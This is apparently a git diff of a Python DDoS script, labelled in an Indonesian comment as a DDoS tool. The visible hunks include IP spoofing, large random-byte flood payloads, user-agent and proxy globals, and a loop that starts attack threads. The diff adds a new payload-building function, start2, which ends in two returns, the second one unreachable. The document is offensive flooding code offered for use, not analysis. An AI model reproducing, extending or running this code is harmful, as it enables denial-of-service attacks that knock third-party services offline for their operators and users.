@@ -1,7 +1,6 @@
 #Ddos Dulu biar gacor
 import threading
 import os, sys
-import time
 import socket
 import random
 import requests
@@ -132,7 +131,14 @@ def spoofer():
     addr[4] = str(random.randrange(2, 254))
     acces =  addr[1] + addr[2] + addr[3] + addr[4]
     return acces
-
+def start2():
+  global useragents, acceptall, ref, socks5
+  global byte3, byte4
+  byte3 = random._urandom(40552)
+  byte4 = random.choice(acceptall)+random._urandom(23451)
+  return byte3
+  return byte4
+  
 def start():
   global useragents, acceptall, ref, socks5
   hh = random._urandom(75006)
@@ -161,3 +167,4 @@ def start():
 for i in range(th):
   th = threading.Thread(target=start)
   th.start()
+  
